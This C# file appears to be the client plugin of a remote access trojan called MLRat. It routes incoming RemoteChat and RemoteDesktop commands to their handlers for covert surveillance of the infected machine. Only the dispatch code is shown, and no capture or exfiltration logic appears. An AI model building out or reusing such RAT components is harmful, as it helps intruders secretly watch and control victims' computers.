using MLRat.Client;
using MLSurveillanceClient.Handlers;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MLSurveillanceClient
{
    class ClientPlugin : IClientPlugin
    {
        public void OnConnect()
        {
            
        }

        public void OnDataRecieved(object[] data)
        {
            NetworkCommand command = (NetworkCommand)data[0];
            if(command == NetworkCommand.RemoteChat)
                RemoteChatHandler.Handle(data);
            if (command == NetworkCommand.RemoteDesktop)
                RemoteDesktopHandler.Handle(data);
        }

        public void OnDisconnect()
        {
            RemoteChatHandler.Disconnect();
        }

        public void OnPluginLoad(IClientHost server)
        {
            RemoteChatHandler.SetNetworkHost(server);
            RemoteDesktopHandler.SetNetworkHost(server);
        }
    }
}
